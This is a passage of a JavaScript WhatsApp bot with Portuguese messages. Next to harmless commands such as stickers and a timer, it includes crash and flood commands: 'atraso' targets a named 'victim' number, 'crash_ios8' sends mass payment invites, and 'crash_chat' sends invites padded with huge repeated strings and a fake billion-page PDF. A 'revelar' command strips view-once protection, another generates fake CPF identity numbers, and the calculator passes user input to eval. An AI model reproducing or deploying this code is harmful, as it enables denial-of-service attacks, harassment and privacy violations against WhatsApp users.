                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replyglobal(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                uwu.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'adicionarprem':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 2)
                    return replyglobal(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replyglobal("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replyglobal("Success")
                }
                break
                
                
                












































































                






case 'menu': 
uwu.sendMessage(from, { react: { text: `☀️`, key: m.key }})
                    if (!isBot && !isCreator) return
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: { url }
  }, {
    upload: uwu.waUploadToServer
  })
  return imageMessage
}
    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {text: "> 🩸 Rui Tsuki 🩸 " },
              carouselMessage: {
                cards: [
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './GlobalMedia/menu.jpg' } }, { upload: uwu.waUploadToServer })),
          title: `
╭───────╮
│gpid
│atraso
│sticker
│gerarcpf
│crash_ios8
│crash_chat
│cronometro
│calculadora
╰───────╯
`,
          gifPlayback: true,
          subtitle: "",
          hasMediaAttachment: false
        }),
                    body: { text: " "},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "  ",
                                        url: `https://youtube.com/@ruitsukiexe?si=AsD1Kb5G0cFlOfX6`,
                                    })
                                },
                      ],
                    },
                  },
],},
                messageVersion: 1,
              },
            },
          },
        },
      {}
    );
    await uwu.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
    await uwu.sendMessage(from, { 
"contextInfo": {"forwardingScore": 127,
"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363366712558316@g.us', newsletterName: `Rui`,serverMessageId: 2 }}})
break






















































































            case 'sticker': //✅⬇️
            case 'stiker':
            case 's': {
                if (!quoted) return replyglobal(`Responder ao vídeo/imagem com legenda ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await uwu.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyglobal('Máximo 10 segundos!')
                    let media = await quoted.download()
                    let encmedia = await uwu.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyglobal(`Enviar Imagens/Vídeos com Legendas ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break







		
		
		
		
		
		
		
		
		
		
		
		
		
		
		

    
    
    
    
    
    
    
    
    
    
    
    
    
    







case '🗑️':
case 'limpar':
if (!isPremium) return replyglobal(mess.prem)
gutoimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break



























           























































                
                
                
                
                
                












































































































































































































































































































































































































case "atraso": { //🩸
  if (!isPremium) return replyglobal(mess.prem)
  if (!text) return replyglobal(`Use ${prefix+command} número da vítima|quantia\nExample ${prefix+command} 55xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} número da vítima|quantidade\nExample ${prefix+command} 55xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("O valor deve ser um número");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await uwu.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "599999999") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("O número não está registrado no WhatsApp");
  }
  replyglobal("por favor, aguarde, " + command + " está em andamento..");
  await sleep(3000);
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(3500);
  sendMessageWithMentions(
    "enviado com sucesso para @" + whatsappNumber.split('@')[0] + 
    "*" + command + "*.", 
    [whatsappNumber]
  );
}
break;





























































































case 'info':
if (!isPremium) return replyglobal(mess.prem)
if (!isBot && !isCreator) return;
uwu.sendMessage(from, { text: JSON.stringify(m.message, null, 4) });
break;















case 'info2':
try {
if (!isPremium) return replyglobal(mess.prem)
json = JSON.parse(JSON.stringify(m.message, null, 4));
fs.writeFileSync('info.json', JSON.stringify(json));
uwu.sendMessage(from, {text: 'json salvo com sucesso !'})
} catch (e) {
console.log(e)
}
break;































































































































































case "crash_ios8": //✅
  {
	if (!isPremium) return replyglobal(mess.prem)
    if (!isBot) {
      return replyglobal("*Este recurso é somente para o bot!*");
    }
    if (!text){
      return replyglobal(`exemplo uso: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("O valor deve ser um número");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("por favor, aguarde, " + command + " bug está em andamento..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('🫀');
  }
  break;
  





































































































case 'crash_chat'://🫀
if (!isPremium) return replyglobal(mess.prem)
jidsgroup = args.join(" ")
for (let i = 0; i < 10; i++) {
await uwu.relayMessage(from, {
'groupInviteMessage': {
"inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
"groupName": `ꫛ`,
'groupJid': '120363366712558316@g.us',
'inviteExpiration': '9999',
'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
"inviteCode": 'h+64P9RhJDzgXSPf',
'contextInfo': {
'isForwarded': true,
'fromMe': false,
'participant': '0@s.whatsapp.net',
'remoteJid': sender,
'quotedMessage': { 
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
title: "crash",
pageCount: 1000000000,
fileName: "crash.pdf",
contactVcard: true
}
},
'forwardedNewsletterMessageInfo': {
'newsletterJid': '120363274419384848@newsletter', 
'serverMessageId': 100,
'newsletterName': "rui  ☿" .repeat(25000),
'newsletterName': "rui  ☿" .repeat(25000),
'newsletterName': "rui  ☿" .repeat(25000),
'newsletterName': "rui  ☿" .repeat(25000),
'newsletterName': "rui  ☿" .repeat(25000),
'newsletterName': "rui  ☿" .repeat(25000),
'newsletterName': "rui  ☿" .repeat(25000),
'newsletterName': "rui  ☿" .repeat(25000),
'newsletterName': "rui  ☿" .repeat(25000),
}
}
}
}, {});
sleep(3000)
}
break;


































case 'gpid':
if (!isPremium) return replyglobal(mess.prem)
uwu.sendMessage(from, { react: { text: `✅`,  key: m.key}})
var getGroups = await uwu.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
teks1 = "ᏞᏆՏͲᎪ ᎠᎬ ᏀᎡႮᏢϴՏ Ꭰϴ ᏴϴͲ\nͲϴͲᎪᏞ ( "+ingfoo.length+" )\n________________________________________"
for (let i = 0; i < ingfoo.length; i++){
teks1 += "\n\n»"+i+"«\n⏤͟͟͞͞ ꦿ𝙽𝚘𝚖𝚎 𝙳𝚘 𝙶𝚛𝚞𝚙𝚘 ↴\n〘 "+ingfoo[i].subject+" 〙\n⏤͟͟͞͞ ꦿ𝙸𝙳 𝙳𝚘 𝙶𝚛𝚞𝚙𝚘 ↴\n× "+ingfoo[i].id+"\n________________________________________"
}
gutoimun(teks1)
break










case 'gerarcpf':
if (!isPremium) return replyglobal(mess.prem)
cp1 = `${Math.floor(Math.random() * 300) + 600}`
cp2 = `${Math.floor(Math.random() * 300) + 600}`
cp3 = `${Math.floor(Math.random() * 300) + 600}`
cp4 = `${Math.floor(Math.random() * 30) + 60}`
cpf = `${cp1}.${cp2}.${cp3}-${cp4}`
await uwu.sendMessage(from, {text: `CPF gerado com sucesso: ${cpf}`}, {quoted: m})
break








case 'revelar':
case 'revelar_visu':
uwu.sendMessage(from, { react: { text: `💩`,  key: m.key}})
if(m.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessageV2 || type == "viewOnceMessage") {
if(JSON.stringify(m).includes("videoMessage")) {
var px = m.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessageV2?.message?.videoMessage || m.message?.viewOnceMessage?.message?.videoMessage
px.viewOnce = false
px.video = {url: px.url}
px.caption += "\n\nO vídeo em visualização única foi revelado.."
await uwu.sendMessage(from,px)
} else {
var px = m.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage
px.viewOnce = false
px.image = {url: px.url}
px.caption += "\n\nA imagem em visualização única foi revelada.."
await uwu.sendMessage(from,px)
}}
break













case 'cronometro'://vncs & nunu
if (!isPremium) return replyglobal(mess.prem)
    async function CronZ(txt, timeArg) {
        let totalTime = parseInt(timeArg, 10) * 60;
        if (isNaN(totalTime) || totalTime > 60) totalTime = 60;
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }//vncs & nunu
        const startMsg = `⏳ *Cronômetro Iniciado* ⏳\n\n${txt.length > 0 ? `*Mensagem:* ${txt}\n\n` : ''}*Tempo Restante: ${Math.floor(totalTime / 60)}:00*`;
        let { key } = await uwu.sendMessage(from, { text: startMsg }, { quoted: m });
//vncs & nunu
        const progressBarLength = 20;
//vncs & nunu
        for (let i = totalTime - 1; i >= 0; i--) {
            const minutes = Math.floor(i / 60);
            const seconds = i % 60;
            const timeString = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            const progress = Math.floor(((totalTime - i) / totalTime) * progressBarLength);
            const progressBar = `[${'█'.repeat(progress)}${'░'.repeat(progressBarLength - progress)}]`;

            await sleep(1000);

            const updateMsg = `⏳ *Cronômetro* ⏳\n\n${txt.length > 0 ? `*Mensagem:* ${txt}\n\n` : ''}> *Tempo Restante:* ${timeString}\n${progressBar}`;
            await uwu.sendMessage(from, { text: updateMsg, edit: key }, { quoted: m });
        }

        const endMsg = `✅ *Tempo Esgotado!* ✅\n\n${txt.length > 0 ? `*Mensagem:* ${txt}\n\n` : ''}*O tempo especificado terminou.*`;
        await uwu.sendMessage(from, { text: endMsg }, { quoted: m });
    }
    const txt = args.slice(1).join(' ');
    const timeArg = args[0];
    CronZ(txt, timeArg);
    break;
    
















case 'calculadora':
rsp = q.replace("x", "*").replace('"', ":").replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", "gi"), "").replace("÷", "/")
return replyglobal(JSON.stringify(eval(rsp, null,'\t')))
break 
















































      











            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyglobal(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyglobal(bang)
                    }
                    try {
                        replyglobal(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyglobal(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyglobal(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyglobal(evaled)
                    } catch (err) {
                        await replyglobal(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyglobal(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyglobal(err)
                        if (stdout) return replyglobal(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})